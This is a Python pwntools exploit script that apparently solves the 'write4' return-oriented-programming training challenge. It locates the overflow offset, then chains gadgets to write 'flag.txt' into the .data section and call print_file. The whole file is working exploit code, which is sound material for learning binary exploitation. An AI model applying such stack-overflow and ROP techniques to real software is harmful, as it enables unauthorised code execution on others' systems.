#!/usr/bin/python3
from pwn import *
import sys
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
exe = './write4'
e = context.binary = ELF(exe, checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = e.debug(gdbscript='''
source /home/nick/global/halfdisp.py
break *main
c
'''
)
def find_ip(payload):
    p = process(exe)
    p.sendlineafter(b"e input already!", payload)
    p.wait()
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

offset = find_ip(cyclic(100))

data_section_address = 0x601028 
pop_r14_pop_r15 = 0x400690
print_file = 0x400620
mov_r14_r15 = 0x400628 
pop_rdi = 0x400693
info("%x# data section",data_section_address)
info("%x# pop r14",pop_r14_pop_r15)
info("%x# printfile",print_file)
info("%x# movr14r15",mov_r14_r15)

payload = flat(
    offset*asm('nop'),
    pop_r14_pop_r15,
    data_section_address,
    b'flag.txt',
    mov_r14_r15,

    pop_rdi,
    data_section_address,
    print_file
)
p.sendline(payload)
p.interactive()




#0000400690 : pop r14 ; pop r15 ; ret

# 0x0000000000400628 <+0>:     mov    QWORD PTR [r14],r15
#   0x0000000000400620 <+9>:     call   0x400510 <print_file@plt>
##  [23] .data   0000000000601028 
